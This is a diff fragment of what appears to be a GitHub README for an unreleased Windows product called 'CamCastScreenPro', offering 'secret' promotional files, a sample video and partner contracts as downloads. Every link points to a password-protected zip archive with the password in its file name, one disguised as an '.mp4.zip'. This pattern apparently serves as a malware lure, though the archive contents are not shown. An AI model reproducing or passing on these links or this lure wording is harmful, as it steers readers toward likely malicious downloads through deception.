@@ -2,7 +2,7 @@
 ### :exclamation:**`Our product supports Windows XP/7/8/10`**:exclamation:    
 We want to warn you that the data in this letter is secret because the official version of the product has not yet been released.  
 **LINK TO DOWNLOAD ALL INFORMATION FOR PROMOTION** - [**CamCastScreenPro_Promo.zip**](https://github.com/CamCastScreen/Promotion/raw/CamCastScreenfiles/CamCastScreenPro_Promo_password7007.zip)  ![https://img.shields.io/jenkins/plugin/i/view-job-filters](https://img.shields.io/jenkins/plugin/i/view-job-filters) ![https://img.shields.io/badge/Realese-No-red](https://img.shields.io/badge/Realese-No-red)    
-#### :exclamation: **YOU CAN DOWNLOAD SAMPLE VIDEO** :exclamation: - [**CamCastScreenPro_Examples of Promotional Video.mp4**](https://github.com/CamCastScreen/Promotion/raw/CamCastScreenfiles/CamCastScreenPro_promo_preroll_video_example_promotion_password7007.mp4.zip)  
+#### :exclamation: **YOU CAN DOWNLOAD SAMPLE VIDEO** :exclamation: - [**CamCastScreenPro_Examples of Promotional Video.mp4**](https://github.com/CamCastScreen/Promotion/raw/main/CamCastScreenPro_promo_preroll_video_example_promotion_password7007.mp4.zip)  
 #### :exclamation: **LINK TO CONTRACTS FOR PARTNERS** :exclamation: - [**CamCastScreenPro contracts_for_partners.pdf**](https://github.com/CamCastScreen/Promotion/raw/main/CamCastScreenPro_promo_contract_for_partners_password7007.zip)
 
 
